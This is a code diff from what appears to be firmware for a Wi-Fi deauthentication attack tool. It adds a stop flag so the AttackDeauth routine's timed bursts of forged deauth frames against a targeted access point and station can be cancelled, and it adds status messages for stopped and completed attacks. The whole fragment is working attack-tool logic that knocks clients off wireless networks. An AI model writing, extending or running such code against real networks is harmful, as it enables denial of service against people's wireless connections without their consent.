@@ -17,16 +17,16 @@ AttackDeauth::AttackDeauth(const MacAddress& sourceAP, const MacAddress& targetS
     memcpy(frame.station, targetSTA.bytes, 6);
 }
 
-void AttackDeauth::start(unsigned int seconds){
+void AttackDeauth::start(volatile bool* stopFlag, unsigned int seconds){
     state.status = attack_status_t::Running;
 
-    Serial.println("Sending");
+    Serial.println("Sending deauth packets...");
 
     // one cycle = 100ms (burst) + 500ms (delay) = 600ms
     unsigned int times = seconds * 1000 / ONE_CYCLE_BURST_SENDING + 1; // 
 
-    for(int i = 0; i < times; i++){
-        for(int j = 0; j < PACKETS_PER_BURST; j++){
+    for(int i = 0; i < times && !(*stopFlag); i++){
+        for(int j = 0; j < PACKETS_PER_BURST && !(*stopFlag); j++){
             sendDeauthFrame();
             delay(SEND_PACKET_DELAY);
         }
@@ -34,7 +34,13 @@ void AttackDeauth::start(unsigned int seconds){
         delay(SEND_BURST_DELAY);
     }
 
-    state.status = attack_status_t::Completed;
+    if (*stopFlag) {
+        Serial.println("\nAttack stopped");
+        state.status = attack_status_t::Canceled;
+    } else {
+        Serial.println("\nAttack completed");
+        state.status = attack_status_t::Completed;
+    }
 }
 
 attack_status_t AttackDeauth::getStatus(){
